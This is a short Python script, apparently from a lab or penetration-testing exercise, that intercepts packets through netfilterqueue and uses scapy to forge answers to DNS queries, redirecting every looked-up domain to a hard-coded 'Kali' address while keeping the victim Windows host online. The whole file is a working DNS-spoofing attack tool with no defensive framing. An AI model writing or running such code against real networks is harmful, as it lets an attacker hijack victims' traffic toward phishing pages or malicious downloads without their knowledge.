import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    
    # Check if it's a DNS query (which uses UDP)
    if scapy_packet.haslayer(scapy.DNSQR) and scapy_packet.haslayer(scapy.UDP):
        qname = scapy_packet[scapy.DNSQR].qname.decode()
        print(f"[!] SPOOFING: {qname}")
        
        # Point them to Kali IP
        answer = scapy.DNSRR(rrname=qname, rdata="192.168.31.129")
        scapy_packet[scapy.DNS].an = answer
        scapy_packet[scapy.DNS].ancount = 1

        # Delete headers so Scapy recalculates them
        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum
        del scapy_packet[scapy.UDP].len
        del scapy_packet[scapy.UDP].chksum

        packet.set_payload(bytes(scapy_packet))

    # Keep the windows host internet running
    packet.accept()

print("[+] FINAL SPOOFER ACTIVE. WAITING FOR TRAFFIC...")
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
